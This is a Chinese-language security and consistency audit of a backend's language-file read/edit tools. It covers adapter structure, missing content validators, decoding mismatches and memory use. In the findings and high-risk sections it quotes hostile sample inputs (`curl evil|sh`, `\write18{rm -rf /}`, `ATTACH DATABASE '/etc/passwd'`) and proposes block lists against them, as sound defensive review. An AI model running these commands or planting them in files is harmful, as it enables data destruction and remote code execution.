# A4 / full-sweep-15 — 语言读写工具对（第二批）+ 文本类工具 同构性审计

审计日期：2026-10-08
分支：`production`
范围：`src/backend/tools/` 下 r/ruby/rust/shell/swift/typescript/sql/prolog 共 8 对，外加 log/latex 共 2 个文本对，以及引擎 `_source_edit.py`、`_files.py`、`_file_cache.py`。

所有结论均基于实际读码 + grep 调用点，未采信任何注释/docstring/设计文档。

---

## 1. 总体结论

- **9/10 对是零逻辑的薄适配器**，全部只做 `SourceEditConfig(...)` + 转发到 `build_source_edit_tools` / `build_source_file_tool`。
- **`typescript_edit.py` 是唯一的异类**：869 行自研实现，是 `_source_edit.py` 的完整平行副本，未迁移到共享引擎。
- **10 个 `_edit.py` 全部没有 `line_validator`**，全仓库只有 `jsonl_edit.py:44` 一个。因此 SQL/LaTeX/shell 编辑器对内容**零过滤**（`_source_edit.py:535-536` 直接 return）。
- **没有任何代码执行链**：全仓库 `subprocess` 仅 2 处（`excel_create.py`、`mcp_client/security.py`），`shell=True` 零命中，`eval(`/`exec(` 零命中（仅 `linalg_tool.py:141` 的 `ast.literal_eval`）。
- 所有 20 个工具的注册点、配置开关、env 映射**全部存在**，无死代码。

---

## 2. 横向对比表

「引擎入口」列：`转发` = 薄适配器转发到 `_source_edit.py`；`自研` = 本文件重写。
「扩展名校验」：读路径 = `_files.resolve_safe_path` 的 `expected_suffixes`；写路径 = 后缀从固定集合强制注入。
「大小上限」：`resolve_safe_path` 的 `stat().st_size` 检查（`_files.py:79-81`）+ 写出前 `len(data) > max_bytes`（`_source_edit.py:851-855`）。默认 `file_read_max_bytes = 5_000_000`（`settings.py:153`）。

### 2.1 `*_edit.py`（10 行）

| 文件 | 引擎入口 | eval/exec/subprocess/os.system | 扩展名校验 | 语法校验环节 | 写入原子 | 大小上限 | 编码/换行处理 |
|---|---|---|---|---|---|---|---|
| r_edit.py | 转发 `build_source_edit_tools` L40 | 无 | Y | **N**（无 line_validator） | Y 引擎 L839-865 | Y | 引擎 `decode_source` L612-663 严格 |
| ruby_edit.py | 转发 L40 | 无 | Y | **N** | Y | Y | 同左 |
| rust_edit.py | 转发 L40 | 无 | Y | **N** | Y | Y | 同左 |
| shell_edit.py | 转发 L40 | 无 | Y（`.sh`/`.bash` 双后缀） | **N** | Y | Y | 同左 |
| swift_edit.py | 转发 L40 | 无 | Y | **N** | Y | Y | 同左 |
| sql_edit.py | 转发 L40 | 无 | Y | **N** | Y | Y | 同左 |
| prolog_edit.py | 转发 L40 | 无 | Y | **N** | Y | Y | 同左 |
| log_edit.py | 转发 L40 | 无 | Y | **N** | Y | Y | 同左 |
| latex_edit.py | 转发 L40 | 无 | Y | **N** | Y | Y | 同左 |
| **typescript_edit.py** | **自研**（L198-291，不调用引擎） | 无 | Y（`.ts`/`.tsx` L37） | **N** | Y 自研 L747-773 | Y 自研 L759-763 | 自研 `_decode_typescript` L530-581 |

### 2.2 `*_file.py`（10 行）

| 文件 | 引擎入口 | eval/exec/subprocess/os.system | 扩展名校验 | 语法校验环节 | 写入原子 | 大小上限 | 编码/换行处理 |
|---|---|---|---|---|---|---|---|
| r_file.py | `build_source_file_tool` L28 | 无 | Y 引擎 L1036-1041 | N（纯读取） | N/A | Y `_files.py:79-81` | `read_text(errors="replace")` 引擎 L1053 **宽松** |
| ruby_file.py | 同左 L28 | 无 | Y | N | N/A | Y | 同左 宽松 |
| rust_file.py | 同左 L28 | 无 | Y | N | N/A | Y | 同左 宽松 |
| shell_file.py | 同左 L28 | 无 | Y | N | N/A | Y | 同左 宽松 |
| swift_file.py | 同左 L28 | 无 | Y | N | N/A | Y | 同左 宽松 |
| sql_file.py | 同左 L28 | 无 | Y | N | N/A | Y | 同左 宽松 |
| prolog_file.py | 同左 L28 | 无 | Y | N | N/A | Y | 同左 宽松 |
| log_file.py | 同左 L28 | 无 | Y | N | N/A | Y | 同左 宽松 |
| latex_file.py | 同左 L28 | 无 | Y | N | N/A | Y | 同左 宽松 |
| **typescript_file.py** | **自研** `build_typescript_file_tool` L40 / `read_typescript_file` L70 | 无 | Y L78-83 | N | N/A | Y | `read_text(errors="replace")` L95 **宽松** |

---

## 3. 不一致清单

### [中等] typescript 对是未迁移的引擎孪生副本，会静默漏掉未来加固

- 证据：`typescript_edit.py:198-291` `build_typescript_edit_tools` 与 `_source_edit.py:170-274` `build_source_edit_tools` 逐段对应（`_run_create`/`_run_inspect`/`_run_edit`、`_reserve_created_output_path`、`_write_*_atomically`、`_reserve_output_path`、`_output_stem`、`_build_file_artifact`、`_is_within` 全部各写一份）。`typescript_file.py:19-113` 同样重写了引擎的 `SourceFileInput`/`build_source_file_tool`/`read_source_file`。
- 关键结构差异（今天等价，明天不等价）：
  - 引擎 `create_source_file` L368 调 `_validate_document_lines(config, document)`，编辑路径 L482 再调一次；`typescript_edit.py:315-326` 与 L422-425 **完全没有这一步**。今天 `typescript` 无 `line_validator` 所以是空操作；一旦有人给 `_source_edit.py` 增加内容过滤，TypeScript 工具不会跟随。
  - 引擎 `decode_source` 是引擎级私有函数，`typescript_edit.py:530` 独立复制成 `_decode_typescript`。
- 触发条件：对 `_source_edit.py` 做任何安全加固（例如给 `SourceEditConfig` 增加 `line_validator` 默认值）。
- 影响：10 对中的 9 对自动受益，1 对静默绕过。这是本仓库「同构性假设被单点打破」的典型形态。
- 建议修法：把 `typescript` 改成薄适配器（`SourceEditConfig(label="TypeScript", suffixes=(".ts",".tsx"), creation_suffix=".ts", ...)`），删掉 869 行中的重复逻辑；`_creation_stem` 已支持多后缀，`.tsx` 特殊处理不需要单独分支。

### [中等] 10 个 `_edit.py` 全部零内容过滤，`_source_edit.py` 的 `line_validator` 钩子只有 jsonl 在用

- 证据：全仓库 grep `line_validator` 仅 4 处命中：`jsonl_edit.py:44`（唯一使用者）、`_source_edit.py:77`（字段声明）、`:535`（空判断）、`:539`（调用）。`_source_edit.py:535-536`：`if config.line_validator is None: return`。
- 后果：`create_sql_file` 写入 `DROP TABLE users; ATTACH DATABASE '/etc/passwd' AS x;` 完全成功；`create_latex_file` 写入 `\write18{rm -rf /}` / `\special{shell:...}` 完全成功；`create_shell_file` 写入 `#!/bin/sh\ncurl evil|sh` 完全成功。三者的返回值都是 `Created ... .sql/.tex/.sh in this chat session.`
- 触发条件：用户显式要求创建/编辑该类型文件。
- 影响：**取决于是否存在下游执行器 —— 结论是无**（见第 5 节）。所以是潜在能力（stored payload），不是活跃 RCE。但一旦有人日后加一个 `run_sql_file` / `compile_latex` 工具，这里就是完整的存储型注入落点。
- 建议修法：给 sql/latex/shell 三个 config 补 `line_validator`，至少黑名单化 `ATTACH`、`LOAD_EXTENSION`、`PRAGMA writable_schema`、`\write18`、`\special`、`\input{`。成本低（引擎钩子已就位），收益是未来加固时不用重新思考。

### [低] 读路径宽松解码 vs 写路径严格解码，同一份文件两个工具给出矛盾结论

- 证据：读路径 `_source_edit.py:1053` `loader=lambda: resolved.read_text(encoding="utf-8", errors="replace")`；写/编辑路径 `_source_edit.py:631` `text = payload.decode("utf-8", errors="strict")`，且 L628-629 额外拒绝 NUL、L637-644 拒绝 C0 控制字符与 0x7F/0xFFFE/0xFFFF。`typescript_file.py:95` 与 L546-562 是同一组宽松/严格分裂。
- 触发条件：上传一个含非法 UTF-8 或 C0 控制字符的 `.log`/`.sh`/`.sql` 文件。
- 影响：`read_log_file` 返回被 U+FFFD 静默污染的正文（模型据以作答却看不到报错），而 `edit_log_file` 对同一文件直接拒绝（`appears to be binary data` / `invalid UTF-8`）。用户会看到「能读不能改」且无任何解释。日志场景尤其容易触发（二进制日志尾部、异常字符）。不是安全问题，但是正确性缺陷，且会被误判成 bug 报修。
- 建议修法：读路径同样走 `decode_source`，失败时返回明确的 `Could not read ...: invalid UTF-8`。

### [低] log 编辑器的 `inspect` 先构造全量列表再截断，5MB 上限下内存放大数十倍

- 证据：`_source_edit.py:438-448` 先把 `document.lines` **全部** `json.dumps` 成列表，L449 `"\n".join`，**然后** L451 才按 `max_chars` 截断。`_read_source_document`（L606 `path.read_bytes()`）无流式读取。
- 触发条件：上传一个贴近 `file_read_max_bytes`（默认 5MB）的 `.log` 文件并调用 `inspect_log_file`。
- 影响：5MB 原始数据 → 5MB 解码 str → 约 50 万行的列表 + 50 万次 `json.dumps` → 拼接后再切片到 20000 字符。单次调用峰值内存可达 40-60MB，且完全用于即将被丢弃的内容。配合本仓库已知的配额饥饿问题（`chat_service.py:69-70` 先抢配额后拿锁），高频调用会放大资源压力，但单独不构成 DoS。
- 建议修法：按行流式生成，累计到 `limit` 就停，同时保留 `len(document.lines)` 供总数显示（先 `count` 一遍）。

### [信息] `_creation_stem` 的多后缀匹配逻辑在 typescript 与引擎中写法不同（当前等价）

- 证据：引擎 `_source_edit.py:791-797` 遍历 `config.suffixes` 取首个命中；`typescript_edit.py:703-706` 硬编码 `".tsx" if requested.lower().endswith(".tsx") else ".ts"`。
- 影响：目前两者输出一致（`x.tsx` → `.tsx`，其余 → `.ts`）。属于同一条不一致清单的组成部分，与第 1 条同源。
- 建议修法：随第 1 条一并消除。

---

## 4. `_file.py` 读取路径是否都走了 `resolve_safe_path`

**结论：全部走了，没有一处自己拼路径。**

- 9 个薄适配器（r/ruby/rust/shell/swift/sql/prolog/log/latex）的 `_file.py` 第 25-28 行统一是 `return build_source_file_tool(settings, X_CONFIG)` → `_source_edit.py:1036-1041` `resolve_safe_path(path, root=root, expected_suffixes=config.suffixes, max_bytes=max_bytes)`。
- `typescript_file.py:78-83` 自研 `read_typescript_file` 同样第一行就是 `resolve_safe_path(..., expected_suffixes=_SUFFIXES, max_bytes=max_bytes)`。
- 写路径不经 `resolve_safe_path`，但也不需要：输出名来自 `_creation_stem` / `_output_stem`，两者都先 `Path(x).name` 剥目录、再 `_SAFE_NAME = r"[^A-Za-z0-9._-]+"` → `_`，后缀由固定集合注入，目录由 `_prepare_session_directory` / `_reserve_output_path` 校验为 `session_root` 内（`_source_edit.py:774-781`、L894-895）。
- 读路径的 `resolve_safe_path` 同时生效：`_BLOCKED_NAMES`/`_BLOCKED_SUFFIXES`（`_files.py:15-26`）、根目录逃逸拒绝、后缀白名单、大小上限。
- 注意：本批 20 个工具**全部依赖** `_files.py` 的这层防护，但本批没有任何一个是 `_files.py` 的偏离者 —— 偏离点全部在 `_source_edit.py` 内部，不在文件解析层。

---

## 5. 高危方向排查结论

### 5.1 shell：写出来的 `.sh`/`.bash` 会不会被当命令执行？ → 确认安全（无执行器）

- (a) 全仓库 `subprocess` 仅 2 处：`excel_create.py:230,333`（固定跑 `node builder.mjs` + 4 个固定路径参数，工作目录是自建临时目录）、`mcp_client/security.py:397`（`create_subprocess_exec` 起 MCP server）。`shell=True` 全仓库零命中；`os.system`/`os.popen`/`.popen`/`pty`/`os.spawn` 零命中；`importlib`/`__import__`/`execfile` 零命中。
- (b) `shell_edit.py` 不阻止 `#!/bin/sh` 或任何危险结构 —— `line_validator` 为空，`_source_edit.py:535-536` 直接放行。**这是事实，但无后果**。
- (c) 没有「执行脚本」类工具与 `build_shell_edit_tools` 配对。`providers.py:312-314` 只注册 create/inspect/edit 三件套。
- 产物只经 `api.py:494-523` `_download_response` 以 `FileResponse(media_type="text/x-shellscript", filename=...)` 下发（`api.py:147-148`），服务端从不执行，浏览器也不会执行 text/*。
- **结论：确认安全。当前 shell 工具链是纯文本往返，不存在 RCE。** 但按 5.2/5.3 的模式，它是三者中最容易被后续工具补成执行链的一支，建议先补 `line_validator` 黑名单（shebang + `eval`/`exec`/管道接 shell）作为预防。

### 5.2 sql：有没有真的执行编辑后 SQL 的工具？ → 无相关代码，确认安全

- grep `sqlite3|psycopg|pymysql|mysql-connector|sqlalchemy|aiosqlite|duckdb` 命中 18 个文件，全部是**应用自身数据库**，没有一个是 SQL 文件执行器：`src/backend/sessions/sqlite.py`、`sessions/checkpoint.py`、`rag/chroma_retriever.py`、`web_search/reputation.py`，其余为 tests/docs。没有任何一处打开 `*.sql` 文件并 `execute` 其内容。
- `sql_edit.py` 同样零过滤（`DROP`/`ATTACH`/`LOAD_EXTENSION`/`PRAGMA writable_schema` 全部可写可编辑），但产物同样只走 `_download_response`（`api.py:149` `application/sql`）。
- **结论：无相关代码。存储型 SQL 注入链目前不成立，因为链路的第二环（执行器）不存在。** 与 5.1 同一风险性质：能力已备好，只差一个未来的执行工具。

### 5.3 typescript：有没有 `node --check` 之类语法校验？ → 无任何语法校验，也就没有顶层代码执行

- grep `node --check` 全仓库零命中。typescript 相关的 `subprocess` 零命中。
- `typescript_edit.py` 的「校验」只有三类：字节级解码（`_decode_typescript` L530-581：拒绝 UTF-16/32 BOM、NUL、C0 控制字符、裸 CR、CRLF/LF 混用）、行级编辑一致性（`_plan_operations` L584-620 用 `expected_text` 精确匹配）、写出后回读比对（`_write_typescript_atomically` L770-772 `validated != document` 则回滚）。**这三类都不解析 TS AST，不启动 node，不会执行任何模块顶层代码。**
- 唯一真正跑 node 的地方是 `excel_create.py:230`，与 typescript 工具无交集。
- **结论：确认安全。类型脚本编辑器从不做语法校验，因此也不存在「校验顺手执行顶层代码」的暴露面。** 副作用是编辑结果可能语法错误且工具无从知晓 —— 属功能缺陷非安全问题。

### 5.4 log：大文件处理、流式读取、大小上限 → 有上限、无流式

- 上限存在且强制：`resolve_safe_path` 在 `stat()` 后检查 `size > max_bytes`（`_files.py:79-81`），默认 5MB（`settings.py:153`，env `FILE_READ_MAX_BYTES`）；写出前再查一次 `len(data) > max_bytes`（`_source_edit.py:851-855`）。
- **无流式读取**：`_read_source_document` L606 `path.read_bytes()` 一次性读入；`read_source_file` L1053 一次性 `read_text`。
- 加剧项：`inspect_source_file` L438-448 先全量构造再截断（见第 3 节第 4 条）。
- 编辑侧反而有硬约束：`_MAX_LINE_CHARS = 50_000`、`_MAX_OPERATIONS = 100`（`_source_edit.py:41-42`），且 `_plan_operations` 先全量验证再 `_apply_operations`，失败零改动。
- **结论：大小上限确认存在（5MB，可配），流式读取确认缺失。** 单独不构成 DoS，但与已记录的配额/锁饥饿问题叠加会放大单次请求的内存与持锁时间。建议流式化 inspect。

### 5.5 latex：有没有 latexmk / pdflatex 配对？ → 无相关代码，确认安全

- grep `latexmk|pdflatex|xelatex|lualatex|tectonic|xeCJK` 全仓库**零命中**（连文档都没有）。
- `latex_edit.py` 零过滤：`\write18`、`\input{}`、`\special`、`\usepackage{shell-escape}`、`\pdfalt` 等元编程后门全部可写可编辑，`_source_edit.py:535-536` 放行。
- 产物同样只经 `_download_response` 下发（`api.py:151` `text/x-tex`）。
- **结论：无相关代码，确认安全。`-shell-escape` RCE 的第二环（编译器）在仓库中不存在。** 三高危方向（shell/sql/latex）结论一致：编辑能力完全开放，执行器一律缺失。

---

## 6. 死代码 grep 结论

**无死代码。全部 20 个工具的注册点、配置开关、env 映射三件套齐全。**

- 注册点（编辑器）：`src/backend/mcp/providers.py:240-356` 的 `session-editing` provider `build()`，其中 `build_typescript_edit_tools:257`、`build_r_edit_tools:284`、`build_rust_edit_tools:285`、`build_shell_edit_tools:312`、`build_sql_edit_tools:318`、`build_swift_edit_tools:321`、`build_log_edit_tools:324`、`build_ruby_edit_tools:333`、`build_latex_edit_tools:336`、`build_prolog_edit_tools:339`。
- 注册点（阅读器）：`providers.py:186-225`，`if not settings.file_read_enabled: return ()` 之后 `build_typescript_file_tool:193`、`build_r_file_tool:201`、`build_rust_file_tool:202`、`build_shell_file_tool:211`、`build_sql_file_tool:213`、`build_log_file_tool:215`、`build_ruby_file_tool:218`、`build_latex_file_tool:219`、`build_prolog_file_tool:220`。
- 包导出：`tools/__init__.py` 全部 20 个 build 函数均在 import 与 `__all__` 中（`:61-62, 70-71, 114-127, 204-224, 336-413`）。
- 配置开关：`config/settings.py:186,223-242` 全部 10 个 `*_edit_enabled` 默认 `False`；`config/loader.py:136,145-164` env 映射齐全，`:549-577` 纳入 bool 解析分支。
- 与内存里记录的 `ManagedOutboundMCPProvider` 那种「只有包内引用、零 app 层调用点」的死代码形态**完全不同** —— 本批每个函数都有唯一的、活的调用方 `providers.py`。
- 唯一「名义导出、无人消费」项：`typescript_edit.py:857-869` 的 `__all__` 导出 `TypeScriptEditOperation`/`TypeScriptCreateInput` 等 11 个符号，`tools/__init__.py:215-224` 只挑了 `build_typescript_edit_tools`/`create_typescript_file`/`TypeScriptFileInput`/`build_typescript_file_tool` 4 个。属公开 API 噪音，不是漏洞。

---

## 7. 测试覆盖观察（与本批漏洞面相关）

- `tests/test_code_edit.py:27-64` 的 `LANGUAGES` 表覆盖 16 个语言对（含本批 16 个 builder 中的 r/rust/go/sql/php/ruby/latex/prolog/haskell/lua/julia/shell/matlab/groovy/swift/log），但全部是**快乐路径往返**（`"SELECT 1;"` → `"SELECT 2;"`、`"echo hello"` → `"echo goodbye"`、`"% preamble"` → `"% main"`）。
- **零条测试断言 SQL `DROP`/`ATTACH`/`LOAD_EXTENSION`/`PRAGMA writable_schema` 被阻止** —— 因为代码里根本没有阻止逻辑。
- **零条测试断言 LaTeX `\write18`/`\input{}`/`\special` 被阻止** —— 同上。
- **零条测试断言 shell shebang 或 `curl|sh` 被阻止** —— 同上。
- `SHELL_CONFIG` 的 `.bash` 后缀路径零测试（表中只有 `deploy.sh`），而它是本批唯一的双后缀 config。
- 全仓库 `line_validator` 只有 1 处测试引用（`tests/test_config.py`），没有任何测试覆盖 `_source_edit.py:529-545` 的验证器分发路径。
- 这与记忆库中 `test_excel_create.py:19-25`（`node_modules` 缺失即整文件 skip）的「环境依赖式静默失测」是不同机制，但后果同源：**测试证明的是「能写」，不是「挡住该挡的」**。

---

## 8. 建议优先级

1. **补 `line_validator`**（sql/latex/shell 三个 config）—— 引擎钩子已就位，改动 30 行以内，把「未来补执行器」的风险前置封堵。
2. **迁移 typescript 到共享引擎** —— 消除唯一的同构性破口，避免未来加固静默漏 1/10。
3. **读路径改用严格解码** —— 消除 read/edit 对同一文件结论矛盾。
4. **`inspect_source_file` 流式化** —— 与已知配额饥饿叠加时降低单次内存峰值。
